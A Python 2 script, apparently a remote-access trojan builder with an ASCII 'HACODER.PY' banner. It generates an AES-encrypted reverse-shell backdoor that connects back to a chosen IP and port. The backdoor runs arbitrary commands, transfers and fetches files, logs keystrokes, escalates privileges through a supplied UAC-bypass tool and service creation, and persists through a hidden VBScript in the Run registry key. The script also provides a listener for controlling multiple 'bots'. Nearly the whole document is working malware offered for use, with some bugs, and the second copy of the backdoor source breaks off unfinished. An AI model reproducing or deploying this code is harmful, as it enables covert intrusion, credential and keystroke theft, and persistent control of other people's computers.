#!/usr/bin/env python

from Crypto.Cipher import AES
import socket
import base64
import os
import sys
import time
import select
import string
import random

#Define clear function
clear = lambda : os.system('tput reset')
clear()
#Define Colors
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

#Print Welcome
print bcolors.BOLD + """
    __  _____   __________  ____  __________    ______  __
   / / / /   | / ____/ __ \/ __ \/ ____/ __ \  / __ \ \/ /
  / /_/ / /| |/ /   / / / / / / / __/ / /_/ / / /_/ /\  / 
 / __  / ___ / /___/ /_/ / /_/ / /___/ _, _/ / ____/ / /  
/_/ /_/_/  |_\____/\____/_____/_____/_/ |_(_)_/     /_/                                                                       
V1.0 Beta\n""" + bcolors.ENDC

#Print Options
print "1: " + bcolors.OKGREEN + "Generate Backdoor" + bcolors.ENDC
print "2: " + bcolors.OKGREEN + "Set Handler" + bcolors.ENDC
print "3: " + bcolors.OKGREEN + "Generate Backdoor and Set Handler" + bcolors.ENDC
print "4: " + bcolors.OKGREEN + "About\n" + bcolors.ENDC
user_choice = raw_input('Select an Option:')

#Check what user chosen
if user_choice=='1':
	host = raw_input('[?] '+bcolors.OKGREEN + 'Your IP: ' + bcolors.ENDC)
	print bcolors.WARNING + "[*] Your IP: " + host + bcolors.ENDC + "\n"
	port = int(input('[?] '+bcolors.OKGREEN + 'Your Port: ' + bcolors.ENDC))
	#print bcolors.WARNING + "[*] Your Port: " + port + bcolors.ENDC + "\n"
	secret = raw_input('[?] '+bcolors.OKGREEN + 'AES Secret (32 random chars): ' + bcolors.ENDC)
	if len(secret) < 32:
		print bcolors.FAIL + "[!] " + bcolors.ENDC +  "Your AES Secret is less than 32 chars!"
		sys.exit()
	if len(secret) > 32:
		print bcolors.FAIL + "[!] " + bcolors.ENDC +  "Your AES Secret is more than 32 chars!"
		sys.exit()
	print bcolors.WARNING + "[*] AES Secret: " + secret + bcolors.ENDC + "\n"
	dire = raw_input('[?] '+bcolors.OKGREEN + 'Save as (location): ' + bcolors.ENDC)
	f = open(dire,'w')
	print "[*] Writing data to " + dire
	
	#Backdoor Source
	backdoor = """
#!/usr/bin/python

from Crypto.Cipher import AES
import subprocess, socket, base64, time, os, sys, urllib2, pythoncom, pyHook, logging
BLOCK_SIZE = 32
PADDING = '{'
pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING
EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)
secret = '"""+secret+"""'
HOST = '"""+host+"""'
PORT = """+port+"""
active = False
def Send(sock, cmd, end="EOFEOFEOFEOFEOFX"):
	sock.sendall(EncodeAES(cipher, cmd + end))
def Receive(sock, end="EOFEOFEOFEOFEOFX"):
	data = ""
	l = sock.recv(1024)
	while(l):
		decrypted = DecodeAES(cipher, l)
		data = data + decrypted
		if data.endswith(end) == True:
			break
		else:
			l = sock.recv(1024)
	return data[:-len(end)]
def Prompt(sock, promptmsg):
	Send(sock, promptmsg)
	answer = Receive(sock)
	return answer
def Upload(sock, filename):
	bgtr = True
	try:
		f = open(filename, 'rb')
		while 1:
			fileData = f.read()
			if fileData == '': break
			Send(sock, fileData, "")
		f.close()
	except:
		time.sleep(0.1)
	time.sleep(0.8)
	Send(sock, "")
	time.sleep(0.8)
	return "Finished download."
def Download(sock, filename):
	g = open(filename, 'wb')
	fileData = Receive(sock)
	time.sleep(0.8)
	g.write(fileData)
	g.close()
	return "Finished upload."
def Downhttp(sock, url):
	filename = url.split('/')[-1].split('#')[0].split('?')[0]
	g = open(filename, 'wb')
	u = urllib2.urlopen(url)
	g.write(u.read())
	g.close()
	return "Finished download."
def Privs(sock):
	if os.name == 'nt':
		privinfo = '\\nUsername:		   ' + Exec('echo %USERNAME%')
		privinfo += Exec('systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"')
		winversion = Exec('systeminfo')
		windowsnew = -1
		windowsold = -1
		windowsnew += winversion.find('Windows 7')
		windowsnew += winversion.find('Windows 8')
		windowsnew += winversion.find('Windows Vista')
		windowsnew += winversion.find('Windows VistaT')
		windowsnew += winversion.find('Windows Server 2008')
		windowsold += winversion.find('Windows XP')
		windowsold += winversion.find('Server 2003')
		if windowsnew > 0:
			privinfo += Exec('whoami /priv') + '\\n'
		admincheck = Exec('net localgroup administrators | find "%USERNAME%"')
		if admincheck != '':
			privinfo += 'Administrator privilege detected.\\n\\n'
			if windowsnew > 0:
				bypassuac = Prompt(sock, privinfo+'Enter location/url for BypassUAC: ')
				if bypassuac.startswith("http") == True:
					try:
						c = Downhttp(sock, bypassuac)
						d = os.getcwd() + '\\\\' + bypassuac.split('/')[-1]
					except:
						return "Download failed: invalid url.\\n"
				else:
					try:
						c = open(bypassuac)
						c.close()
						d = bypassuac
					except:
						return "Invalid location for BypassUAC.\\n"
			curdir = os.path.join(sys.path[0], sys.argv[0])
			if windowsnew > 0: elvpri = Exec(d + ' elevate /c sc create blah binPath= "cmd.exe /c ' + curdir + '" type= own start= auto')
			if windowsold > 0: elvpri = Exec('sc create blah binPath= "' + curdir + '" type= own start= auto')
			if windowsnew > 0: elvpri = Exec(d + ' elevate /c sc start blah')
			if windowsold > 0: elvpri = Exec('sc start blah')
			return "\\nPrivilege escalation complete.\\n"
		if windowsold > 0:
			privinfo += 'Unable to escalate privileges.\\n'
			return privinfo
		privinfo += 'Searching for weak permissions...\\n\\n'
		permatch = []
		permatch.append("BUILTIN\Users:(I)(F)")
		permatch.append("BUILTIN\Users:(F)")
		permbool = False
		xv = Exec('for /f "tokens=2 delims=\\'=\\'" %a in (\\'wmic service list full^|find /i "pathname"^|find /i /v "system32"\\') do @echo %a >> p1.txt')
		xv = Exec('for /f eol^=^"^ delims^=^" %a in (p1.txt) do cmd.exe /c icacls "%a" >> p2.txt')
		time.sleep(40)
		ap = 0
		bp = 0
		dp = open('p2.txt')
		lines = dp.readlines()
		for line in lines:
			cp = 0
			while cp < len(permatch):
				j = line.find(permatch[cp])
				if j != -1:
					if permbool == False:
						privinfo += 'The following directories have write access:\\n\\n'
						permbool = True
					bp = ap
					while True:
						if len(lines[bp].split('\\\\')) > 2:
							while bp <= ap:
								privinfo += lines[bp]
								bp += 1
							break
						else:
							bp -= 1
				cp += 1
			ap += 1
		time.sleep(4)
		if permbool == True: privinfo += '\\nReplace executable with Python shell.\\n'
		if permbool == False: privinfo += '\\nNo directories with misconfigured premissions found.\\n'
		dp.close()
		xv = Exec('del p1.txt')
		xv = Exec('del p2.txt')
		return privinfo
def Persist(sock, redown=None, newdir=None):
	if os.name == 'nt':
		privscheck = Exec('reg query "HKU\S-1-5-19" | find "error"')
		if privscheck != '':
			return "You must be authority\system to enable persistence.\\n"
		else:
			exedir = os.path.join(sys.path[0], sys.argv[0])
			exeown = exedir.split('\\\\')[-1]
			vbsdir = os.getcwd() + '\\\\' + 'vbscript.vbs'
			if redown == None: vbscript = 'state = 1\\nhidden = 0\\nwshname = "' + exedir + '"\\nvbsname = "' + vbsdir + '"\\nWhile state = 1\\nexist = ReportFileStatus(wshname)\\nIf exist = True then\\nset objFSO = CreateObject("Scripting.FileSystemObject")\\nset objFile = objFSO.GetFile(wshname)\\nif objFile.Attributes AND 2 then\\nelse\\nobjFile.Attributes = objFile.Attributes + 2\\nend if\\nset objFSO = CreateObject("Scripting.FileSystemObject")\\nset objFile = objFSO.GetFile(vbsname)\\nif objFile.Attributes AND 2 then\\nelse\\nobjFile.Attributes = objFile.Attributes + 2\\nend if\\nSet WshShell = WScript.CreateObject ("WScript.Shell")\\nSet colProcessList = GetObject("Winmgmts:").ExecQuery ("Select * from Win32_Process")\\nFor Each objProcess in colProcessList\\nif objProcess.name = "' + exeown + '" then\\nvFound = True\\nEnd if\\nNext\\nIf vFound = True then\\nwscript.sleep 50000\\nElse\\nWshShell.Run  + exedir + ,hidden\\nwscript.sleep 50000\\nEnd If\\nvFound = False\\nElse\\nwscript.sleep 50000\\nEnd If\\nWend\\nFunction ReportFileStatus(filespec)\\nDim fso, msg\\nSet fso = CreateObject("Scripting.FileSystemObject")\\nIf (fso.FileExists(filespec)) Then\\nmsg = True\\nElse\\nmsg = False\\nEnd If\\nReportFileStatus = msg\\nEnd Function\\n'
			else:
				if newdir == None: 
					newdir = exedir
					newexe = exeown
				else: 
					newexe = newdir.split('\\\\')[-1]
				vbscript = 'state = 1\\nhidden = 0\\nwshname = "' + exedir + '"\\nvbsname = "' + vbsdir + '"\\nurlname = "' + redown + '"\\ndirname = "' + newdir + '"\\nWhile state = 1\\nexist1 = ReportFileStatus(wshname)\\nexist2 = ReportFileStatus(dirname)\\nIf exist1 = False And exist2 = False then\\ndownload urlname, dirname\\nEnd If\\nIf exist1 = True Or exist2 = True then\\nif exist1 = True then\\nset objFSO = CreateObject("Scripting.FileSystemObject")\\nset objFile = objFSO.GetFile(wshname)\\nif objFile.Attributes AND 2 then\\nelse\\nobjFile.Attributes = objFile.Attributes + 2\\nend if\\nexist2 = False\\nend if\\nif exist2 = True then\\nset objFSO = CreateObject("Scripting.FileSystemObject")\\nset objFile = objFSO.GetFile(dirname)\\nif objFile.Attributes AND 2 then\\nelse\\nobjFile.Attributes = objFile.Attributes + 2\\nend if\\nend if\\nset objFSO = CreateObject("Scripting.FileSystemObject")\\nset objFile = objFSO.GetFile(vbsname)\\nif objFile.Attributes AND 2 then\\nelse\\nobjFile.Attributes = objFile.Attributes + 2\\nend if\\nSet WshShell = WScript.CreateObject ("WScript.Shell")\\nSet colProcessList = GetObject("Winmgmts:").ExecQuery ("Select * from Win32_Process")\\nFor Each objProcess in colProcessList\\nif objProcess.name = "' + exeown + '" OR objProcess.name = "' + newexe + '" then\\nvFound = True\\nEnd if\\nNext\\nIf vFound = True then\\nwscript.sleep 50000\\nEnd If\\nIf vFound = False then\\nIf exist1 = True then\\nWshShell.Run  + exedir + ,hidden\\nEnd If\\nIf exist2 = True then\\nWshShell.Run  + dirname + ,hidden\\nEnd If\\nwscript.sleep 50000\\nEnd If\\nvFound = False\\nEnd If\\nWend\\nFunction ReportFileStatus(filespec)\\nDim fso, msg\\nSet fso = CreateObject("Scripting.FileSystemObject")\\nIf (fso.FileExists(filespec)) Then\\nmsg = True\\nElse\\nmsg = False\\nEnd If\\nReportFileStatus = msg\\nEnd Function\\nfunction download(sFileURL, sLocation)\\nSet objXMLHTTP = CreateObject("MSXML2.XMLHTTP")\\nobjXMLHTTP.open "GET", sFileURL, false\\nobjXMLHTTP.send()\\ndo until objXMLHTTP.Status = 200 :  wscript.sleep(1000) :  loop\\nIf objXMLHTTP.Status = 200 Then\\nSet objADOStream = CreateObject("ADODB.Stream")\\nobjADOStream.Open\\nobjADOStream.Type = 1\\nobjADOStream.Write objXMLHTTP.ResponseBody\\nobjADOStream.Position = 0\\nSet objFSO = Createobject("Scripting.FileSystemObject")\\nIf objFSO.Fileexists(sLocation) Then objFSO.DeleteFile sLocation\\nSet objFSO = Nothing\\nobjADOStream.SaveToFile sLocation\\nobjADOStream.Close\\nSet objADOStream = Nothing\\nEnd if\\nSet objXMLHTTP = Nothing\\nEnd function\\n'
			
			vbs = open('vbscript.vbs', 'wb')
			vbs.write(vbscript)
			vbs.close()
			persist = Exec('reg ADD HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v blah /t REG_SZ /d "' + vbsdir + '"')
			persist += '\\nPersistence complete.\\n'
			return persist
def Exec(cmde):
	if cmde:
		execproc = subprocess.Popen(cmde, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
		cmdoutput = execproc.stdout.read() + execproc.stderr.read()
		return cmdoutput
	else:
		return "Enter a command.\\n"
LOG_STATE = False
LOG_FILENAME = 'keylog.txt'
def OnKeyboardEvent(event):
    logging.basicConfig(filename=LOG_FILENAME,
                        level=logging.DEBUG,
                        format='%(message)s')
    logging.log(10,chr(event.Ascii))
    return True		
while True:
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((HOST, PORT))
		cipher = AES.new(secret)
		data = Receive(s)
		if data == 'Activate':
			active = True
			Send(s, "\\n"+os.getcwd()+">")
		while active:
			data = Receive(s)
			if data == '':
				time.sleep(0.02)
			if data == "quit" or data == "terminate":
				Send(s, "quitted")
				break
			elif data.startswith("cd ") == True:
				try:
					os.chdir(data[3:])
					stdoutput = ""
				except:
					stdoutput = "Error opening directory.\\n"
				
			# check for download
			elif data.startswith("download") == True:
				# Upload the file
				stdoutput = Upload(s, data[9:])
			
			elif data.startswith("downhttp") == True:
				# Download from url
				stdoutput = Downhttp(s, data[9:])

			# check for upload
			elif data.startswith("upload") == True:
				# Download the file
				stdoutput = Download(s, data[7:])
				
			elif data.startswith("privs") == True:
				# Attempt to elevate privs
				stdoutput = Privs(s)
				
			elif data.startswith("persist") == True:
				# Attempt persistence
				if len(data.split(' ')) == 1: stdoutput = Persist(s)
				elif len(data.split(' ')) == 2: stdoutput = Persist(s, data.split(' ')[1])
				elif len(data.split(' ')) == 3: stdoutput = Persist(s, data.split(' ')[1], data.split(' ')[2])
			
			elif data.startswith("keylog") == True:
				# Begin keylogging
				if LOG_STATE == False:
					try:
						# set to True
						LOG_STATE = True
						hm = pyHook.HookManager()
						hm.KeyDown = OnKeyboardEvent
						hm.HookKeyboard()
						pythoncom.PumpMessages()
						stdoutput = "Logging keystrokes to: "+LOG_FILENAME+"...\\n"
					except:
						ctypes.windll.user32.PostQuitMessage(0)
						# set to False
						LOG_STATE = False
						stdoutput = "Keystrokes have been logged to: "+LOG_FILENAME+".\\n"
						
					
			else:
				# execute command.
				stdoutput = Exec(data)
				
			# send data
			stdoutput = stdoutput+"\\n"+os.getcwd()+">"
			Send(s, stdoutput)
			
		# loop ends here
		
		if data == "terminate":
			break
		time.sleep(3)
	except socket.error:
		s.close()
		time.sleep(10)
		continue"""
	f.write(backdoor)
	f.close()
	print bcolors.OKGREEN + "[*] Success!" + bcolors.ENDC
if user_choice=='2':
	portH = int(input('[?] '+bcolors.OKGREEN + 'Your Port: ' + bcolors.ENDC))
	secretH = raw_input('[?] '+bcolors.OKGREEN + 'AES Secret (same as in backdoor): ' + bcolors.ENDC)
	if len(secretH) < 32:
		print bcolors.FAIL + "[!] " + bcolors.ENDC +  "Your AES Secret is less than 32 chars!"
		sys.exit()
	if len(secretH) > 32:
		print bcolors.FAIL + "[!] " + bcolors.ENDC +  "Your AES Secret is more than 32 chars!"
		sys.exit()
	clear()
	BLOCK_SIZE=32
	PADDING = '{'
	pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING
	EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
	DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)
	# clear function
	##################################
	# Windows ---------------> cls
	# Linux   ---------------> clear
	if os.name == 'posix': clf = 'clear'
	if os.name == 'nt': clf = 'cls'
	clear = lambda: os.system(clf)

	# initialize socket
	c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	c.bind(('0.0.0.0', portH))
	c.listen(128)

	# client information
	active = False
	clients = []
	socks = []
	interval = 0.8

	# Functions
	###########

	# send data
	def Send(sock, cmd, end="EOFEOFEOFEOFEOFX"):
		sock.sendall(EncodeAES(cipher, cmd + end))

	# receive data
	def Receive(sock, end="EOFEOFEOFEOFEOFX"):
		data = ""
		l = sock.recv(1024)
		while(l):
			decrypted = DecodeAES(cipher, l)
			data += decrypted
			if data.endswith(end) == True:
				break
			else:
				l = sock.recv(1024)
		return data[:-len(end)]

	# download file
	def download(sock, remote_filename, local_filename=None):
		# check if file exists
		if not local_filename:
			local_filename = remote_filename
		try:
			f = open(local_filename, 'wb')
		except IOError:
			print "Error opening file.\n"
			Send(sock, "cd .")
			return
		# start transfer
		Send(sock, "download "+remote_filename)
		print "Downloading: " + remote_filename + " > " + local_filename
		fileData = Receive(sock)
		f.write(fileData)
		time.sleep(interval)
		f.close()
		time.sleep(interval)

	# upload file
	def upload(sock, local_filename, remote_filename=None):
		# check if file exists
		if not remote_filename:
			remote_filename = local_filename
		try:
			g = open(local_filename, 'rb')
		except IOError:
			print "Error opening file.\n"
			Send(sock, "cd .")
			return
		# start transfer
		Send(sock, "upload "+remote_filename)
		print 'Uploading: ' + local_filename + " > " + remote_filename
		while True:
			fileData = g.read()
			if not fileData: break
			Send(sock, fileData, "")
		g.close()
		time.sleep(interval)
		Send(sock, "")
		time.sleep(interval)
	
	# refresh clients
	def refresh():
		clear()
		print bcolors.OKGREEN + '\nListening for bots...\n' + bcolors.ENDC
		if len(clients) > 0:
			for j in range(0,len(clients)):
				print '[' + str((j+1)) + '] Client: ' + clients[j] + '\n'
		else:
			print "...\n"
		# print exit option
		print "---\n"
		print bcolors.FAIL + "[0] Exit \n" + bcolors.ENDC
		print bcolors.WARNING + "\nPress Ctrl+C to interact with client." + bcolors.ENDC
		print bcolors.OKGREEN

	# main loop
	while True:
		refresh()
		# listen for clients
		try:
			# set timeout
			c.settimeout(10)
		
			# accept connection
			try:
				s,a = c.accept()
			except socket.timeout:
				continue
		
			# add socket
			if (s):
				s.settimeout(None)
				socks += [s]
				clients += [str(a)]
		
			# display clients
			refresh()
		
			# sleep
			time.sleep(interval)

		except KeyboardInterrupt:
		
			# display clients
			refresh()
		
			# accept selection --- int, 0/1-128
			activate = input("\nEnter option: ")
		
			# exit
			if activate == 0:
				print '\nExiting...\n'
				for j in range(0,len(socks)):
					socks[j].close()
				sys.exit()
		
			# subtract 1 (array starts at 0)
			activate -= 1
	
			# clear screen
			clear()
		
			# create a cipher object using the random secret
			cipher = AES.new(secret)
			print '\nActivating client: ' + clients[activate] + '\n'
			print "DOWNLOAD	Download files from Client"
			print "UPLOAD		Upload files to Client"
			print "PERSIST		Make backdoor run on startup"

			active = True
			Send(socks[activate], 'Activate')
		print bcolors.ENDC
		# interact with client
		while active:
			try:
				# receive data from client
				data = Receive(socks[activate])
			# disconnect client.
			except:
				print '\nClient disconnected... ' + clients[activate]
				# delete client
				socks[activate].close()
				time.sleep(0.8)
				socks.remove(socks[activate])
				clients.remove(clients[activate])
				refresh()
				active = False
				break

			# exit client session
			if data == 'quitted':
				# print message
				print "Exit.\n"
				# remove from arrays
				socks[activate].close()
				socks.remove(socks[activate])
				clients.remove(clients[activate])
				# sleep and refresh
				time.sleep(0.8)
				refresh()
				active = False
				break
			# if data exists
			elif data != '':
				# get next command
				sys.stdout.write(data)
				nextcmd = raw_input()
		
			# download
			if nextcmd.startswith("download ") == True:
				if len(nextcmd.split(' ')) > 2:
					download(socks[activate], nextcmd.split(' ')[1], nextcmd.split(' ')[2])
				else:
					download(socks[activate], nextcmd.split(' ')[1])
		
			# upload
			elif nextcmd.startswith("upload ") == True:
				if len(nextcmd.split(' ')) > 2:
					upload(socks[activate], nextcmd.split(' ')[1], nextcmd.split(' ')[2])
				else:
					upload(socks[activate], nextcmd.split(' ')[1])
		
			# normal command
			elif nextcmd != '':
				Send(socks[activate], nextcmd)

			elif nextcmd == '':
				print 'Think before you type. ;)\n'
if user_choice=='3':
	host = raw_input('[?] '+bcolors.OKGREEN + 'Your IP: ' + bcolors.ENDC)
	print bcolors.WARNING + "[*] Your IP: " + host + bcolors.ENDC + "\n"
	port = raw_input('[?] '+bcolors.OKGREEN + 'Your Port: ' + bcolors.ENDC)
	#print bcolors.WARNING + "[*] Your Port: " + port + bcolors.ENDC + "\n"
	secret1 = ''.join([random.choice(string.ascii_letters + string.digits) for n in xrange(32)])
	print bcolors.WARNING + "[*] Recommended AES Key (copy it): " + secret1 + bcolors.ENDC + "\n"
	secret = raw_input('[?] '+bcolors.OKGREEN + 'AES Secret Key: ' + bcolors.ENDC)
	dire = raw_input('[?] '+bcolors.OKGREEN + 'Save as (location): ' + bcolors.ENDC)
	f = open(dire,'w')
	print "[*] Writing data to " + dire
	backdoor = """
#!/usr/bin/python

from Crypto.Cipher import AES
import subprocess, socket, base64, time, os, sys, urllib2, pythoncom, pyHook, logging
BLOCK_SIZE = 32
PADDING = '{'
pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING
EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)
secret = '"""+secret+"""'
HOST = '"""+host+"""'
PORT = """+port+"""
active = False
def Send(sock, cmd, end="EOFEOFEOFEOFEOFX"):
	sock.sendall(EncodeAES(cipher, cmd + end))
def Receive(sock, end="EOFEOFEOFEOFEOFX"):
	data = ""
	l = sock.recv(1024)
	while(l):
		decrypted = DecodeAES(cipher, l)
		data = data + decrypted
		if data.endswith(end) == True:
			break
		else:
			l = sock.recv(1024)
	return data[:-len(end)]
def Prompt(sock, promptmsg):
	Send(sock, promptmsg)
	answer = Receive(sock)
	return answer
def Upload(sock, filename):
	bgtr = True
	try:
		f = open(filename, 'rb')
		while 1:
			fileData = f.read()
			if fileData == '': break
			Send(sock, fileData, "")
		f.close()
	except:
		time.sleep(0.1)
	time.sleep(0.8)
	Send(sock, "")
	time.sleep(0.8)
	return "Finished download."
def Download(sock, filename):
	g = open(filename, 'wb')
	fileData = Receive(sock)
	time.sleep(0.8)
	g.write(fileData)
	g.close()
	return "Finished upload."
def Downhttp(sock, url):
	filename = url.split('/')[-1].split('#')[0].split('?')[0]
	g = open(filename, 'wb')
	u = urllib2.urlopen(url)
	g.write(u.read())
	g.close()
	return "Finished download."
def Privs(sock):
	if os.name == 'nt':
		privinfo = '\\nUsername:		   ' + Exec('echo %USERNAME%')
		privinfo += Exec('systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"')
		winversion = Exec('systeminfo')
		windowsnew = -1
		windowsold = -1
		windowsnew += winversion.find('Windows 7')
		windowsnew += winversion.find('Windows 8')
		windowsnew += winversion.find('Windows Vista')
		windowsnew += winversion.find('Windows VistaT')
		windowsnew += winversion.find('Windows Server 2008')
		windowsold += winversion.find('Windows XP')
		windowsold += winversion.find('Server 2003')
		if windowsnew > 0:
			privinfo += Exec('whoami /priv') + '\\n'
		admincheck = Exec('net localgroup administrators | find "%USERNAME%"')
		if admincheck != '':
			privinfo += 'Administrator privilege detected.\\n\\n'
			if windowsnew > 0:
				bypassuac = Prompt(sock, privinfo+'Enter location/url for BypassUAC: ')
				if bypassuac.startswith("http") == True:
					try:
						c = Downhttp(sock, bypassuac)
						d = os.getcwd() + '\\\\' + bypassuac.split('/')[-1]
					except:
						return "Download failed: invalid url.\\n"
				else:
					try:
						c = open(bypassuac)
						c.close()
						d = bypassuac
					except:
						return "Invalid location for BypassUAC.\\n"
			curdir = os.path.join(sys.path[0], sys.argv[0])
			if windowsnew > 0: elvpri = Exec(d + ' elevate /c sc create blah binPath= "cmd.exe /c ' + curdir + '" type= own start= auto')
			if windowsold > 0: elvpri = Exec('sc create blah binPath= "' + curdir + '" type= own start= auto')
			if windowsnew > 0: elvpri = Exec(d + ' elevate /c sc start blah')
			if windowsold > 0: elvpri = Exec('sc start blah')
			return "\\nPrivilege escalation complete.\\n"
		if windowsold > 0:
			privinfo += 'Unable to escalate privileges.\\n'
			return privinfo
		privinfo += 'Searching for weak permissions...\\n\\n'
		permatch = []
		permatch.append("BUILTIN\Users:(I)(F)")
		permatch.append("BUILTIN\Users:(F)")
		permbool = False
		xv = Exec('for /f "tokens=2 delims=\\'=\\'" %a in (\\'wmic service list full^|find /i "pathname"^|find /i /v "system32"\\') do @echo %a >> p1.txt')
		xv = Exec('for /f eol^=^"^ delims^=^" %a in (p1.txt) do cmd.exe /c icacls "%a" >> p2.txt')
		time.sleep(40)
		ap = 0
		bp = 0
		dp = open('p2.txt')
		lines = dp.readlines()
		for line in lines:
			cp = 0
			while cp < len(permatch):
				j = line.find(permatch[cp])
				if j != -1:
					if permbool == False:
						privinfo += 'The following directories have write access:\\n\\n'
						permbool = True
					bp = ap
					while True:
						if len(lines[bp].split('\\\\')) > 2:
							while bp <= ap:
								privinfo += lines[bp]
								bp += 1
							break
						else:
							bp -= 1
				cp += 1
			ap += 1
		time.sleep(4)
		if permbool == True: privinfo += '\\nReplace executable with Python shell.\\n'
		if permbool == False: privinfo += '\\nNo directories with misconfigured premissions found.\\n'
		dp.close()
		xv = Exec('del p1.txt')
		xv = Exec('del p2.txt')
		return privinfo
def Persist(sock, redown=None, newdir=None):
	if os.name == 'nt':
		privscheck = Exec('reg query "HKU\S-1-5-19" | find "error"')
		if privscheck != '':
			return "You must be authority\system to enable persistence.\\n"
		else:
			exedir = os.path.join(sys.path[0], sys.argv[0])
			exeown = exedir.split('\\\\')[-1]
			vbsdir = os.getcwd() + '\\\\' + 'vbscript.vbs'
			if redown == None: vbscript = 'state = 1\\nhidden = 0\\nwshname = "' + exedir + '"\\nvbsname = "' + vbsdir + '"\\nWhile state = 1\\nexist = ReportFileStatus(wshname)\\nIf exist = True then\\nset objFSO = CreateObject("Scripting.FileSystemObject")\\nset objFile = objFSO.GetFile(wshname)\\nif objFile.Attributes AND 2 then\\nelse\\nobjFile.Attributes = objFile.Attributes + 2\\nend if\\nset objFSO = CreateObject("Scripting.FileSystemObject")\\nset objFile = objFSO.GetFile(vbsname)\\nif objFile.Attributes AND 2 then\\nelse\\nobjFile.Attributes = objFile.Attributes + 2\\nend if\\nSet WshShell = WScript.CreateObject ("WScript.Shell")\\nSet colProcessList = GetObject("Winmgmts:").ExecQuery ("Select * from Win32_Process")\\nFor Each objProcess in colProcessList\\nif objProcess.name = "' + exeown + '" then\\nvFound = True\\nEnd if\\nNext\\nIf vFound = True then\\nwscript.sleep 50000\\nElse\\nWshShell.Run  + exedir + ,hidden\\nwscript.sleep 50000\\nEnd If\\nvFound = False\\nElse\\nwscript.sleep 50000\\nEnd If\\nWend\\nFunction ReportFileStatus(filespec)\\nDim fso, msg\\nSet fso = CreateObject("Scripting.FileSystemObject")\\nIf (fso.FileExists(filespec)) Then\\nmsg = True\\nElse\\nmsg = False\\nEnd If\\nReportFileStatus = msg\\nEnd Function\\n'
			else:
				if newdir == None: 
					newdir = exedir
					newexe = exeown
				else: 
					newexe = newdir.split('\\\\')[-1]
				vbscript = 'state = 1\\nhidden = 0\\nwshname = "' + exedir + '"\\nvbsname = "' + vbsdir + '"\\nurlname = "' + redown + '"\\ndirname = "' + newdir + '"\\nWhile state = 1\\nexist1 = ReportFileStatus(wshname)\\nexist2 = ReportFileStatus(dirname)\\nIf exist1 = False And exist2 = False then\\ndownload urlname, dirname\\nEnd If\\nIf exist1 = True Or exist2 = True then\\nif exist1 = True then\\nset objFSO = CreateObject("Scripting.FileSystemObject")\\nset objFile = objFSO.GetFile(wshname)\\nif objFile.Attributes AND 2 then\\nelse\\nobjFile.Attributes = objFile.Attributes + 2\\nend if\\nexist2 = False\\nend if\\nif exist2 = True then\\nset objFSO = CreateObject("Scripting.FileSystemObject")\\nset objFile = objFSO.GetFile(dirname)\\nif objFile.Attributes AND 2 then\\nelse\\nobjFile.Attributes = objFile.Attributes + 2\\nend if\\nend if\\nset objFSO = CreateObject("Scripting.FileSystemObject")\\nset objFile = objFSO.GetFile(vbsname)\\nif objFile.Attributes AND 2 then\\nelse\\nobjFile.Attributes = objFile.Attributes + 2\\nend if\\nSet WshShell = WScript.CreateObject ("WScript.Shell")\\nSet colProcessList = GetObject("Winmgmts:").ExecQuery ("Select * from Win32_Process")\\nFor Each objProcess in colProcessList\\nif objProcess.name = "' + exeown + '" OR objProcess.name = "' + newexe + '" then\\nvFound = True\\nEnd if\\nNext\\nIf vFound = True then\\nwscript.sleep 50000\\nEnd If\\nIf vFound = False then\\nIf exist1 = True then\\nWshShell.Run  + exedir + ,hidden\\nEnd If\\nIf exist2 = True then\\nWshShell.Run  + dirname + ,hidden\\nEnd If\\nwscript.sleep 50000\\nEnd If\\nvFound = False\\nEnd If\\nWend\\nFunction ReportFileStatus(filespec)\\nDim fso, msg\\nSet fso = CreateObject("Scripting.FileSystemObject")\\nIf (fso.FileExists(filespec)) Then\\nmsg = True\\nElse\\nmsg = False\\nEnd If\\nReportFileStatus = msg\\nEnd Function\\nfunction download(sFileURL, sLocation)\\nSet objXMLHTTP = CreateObject("MSXML2.XMLHTTP")\\nobjXMLHTTP.open "GET", sFileURL, false\\nobjXMLHTTP.send()\\ndo until objXMLHTTP.Status = 200 :  wscript.sleep(1000) :  loop\\nIf objXMLHTTP.Status = 200 Then\\nSet objADOStream = CreateObject("ADODB.Stream")\\nobjADOStream.Open\\nobjADOStream.Type = 1\\nobjADOStream.Write objXMLHTTP.ResponseBody\\nobjADOStream.Position = 0\\nSet objFSO = Createobject("Scripting.FileSystemObject")\\nIf objFSO.Fileexists(sLocation) Then objFSO.DeleteFile sLocation\\nSet objFSO = Nothing\\nobjADOStream.SaveToFile sLocation\\nobjADOStream.Close\\nSet objADOStream = Nothing\\nEnd if\\nSet objXMLHTTP = Nothing\\nEnd function\\n'
			
			vbs = open('vbscript.vbs', 'wb')
			vbs.write(vbscript)
			vbs.close()
			persist = Exec('reg ADD HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v blah /t REG_SZ /d "' + vbsdir + '"')
			persist += '\\nPersistence complete.\\n'
			return persist
def Exec(cmde):
	if cmde:
		execproc = subprocess.Popen(cmde, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
		cmdoutput = execproc.stdout.read() + execproc.stderr.read()
		return cmdoutput
	else:
		return "Enter a command.\\n"
LOG_STATE = False
